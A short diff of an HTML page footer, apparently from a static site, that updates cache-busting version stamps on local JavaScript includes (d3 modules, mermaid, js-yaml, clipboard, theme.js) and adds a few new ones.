-    <script src="/js/d3/d3-ease.min.js?1735213999" defer></script>
-    <script src="/js/d3/d3-interpolate.min.js?1735213999" defer></script>
-    <script src="/js/d3/d3-selection.min.js?1735213999" defer></script>
-    <script src="/js/d3/d3-timer.min.js?1735213999" defer></script>
-    <script src="/js/d3/d3-transition.min.js?1735213999" defer></script>
-    <script src="/js/d3/d3-zoom.min.js?1735213999" defer></script>
-    <script src="/js/js-yaml.min.js?1735213999" defer></script>
-    <script src="/js/mermaid.min.js?1735213999" defer></script>
+    <script src="/js/clipboard.min.js?1735218691" defer></script>
+    <script src="/js/perfect-scrollbar.min.js?1735218691" defer></script>
+    <script src="/js/d3/d3-color.min.js?1735218691" defer></script>
+    <script src="/js/d3/d3-dispatch.min.js?1735218691" defer></script>
+    <script src="/js/d3/d3-drag.min.js?1735218691" defer></script>
+    <script src="/js/d3/d3-ease.min.js?1735218691" defer></script>
+    <script src="/js/d3/d3-interpolate.min.js?1735218691" defer></script>
+    <script src="/js/d3/d3-selection.min.js?1735218691" defer></script>
+    <script src="/js/d3/d3-timer.min.js?1735218691" defer></script>
+    <script src="/js/d3/d3-transition.min.js?1735218691" defer></script>
+    <script src="/js/d3/d3-zoom.min.js?1735218691" defer></script>
+    <script src="/js/js-yaml.min.js?1735218691" defer></script>
+    <script src="/js/mermaid.min.js?1735218691" defer></script>
     <script>
       window.themeUseMermaid = JSON.parse("{}");
     </script>
-    <script src="/js/theme.js?1735213999" defer></script>
+    <script src="/js/theme.js?1735218691" defer></script>
   </body>
 </html>
